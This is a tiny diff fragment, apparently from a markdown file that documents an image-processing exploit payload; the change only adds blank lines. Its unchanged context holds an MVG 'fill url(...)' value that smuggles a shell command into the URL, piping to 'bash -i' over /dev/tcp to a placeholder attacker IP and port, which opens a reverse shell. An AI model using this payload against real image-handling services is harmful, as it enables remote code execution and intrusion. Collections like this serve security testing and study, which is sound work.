@@ -17,3 +17,5 @@ viewbox 0 0 640 480
 fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
 pop graphic-context
 ```
+
+
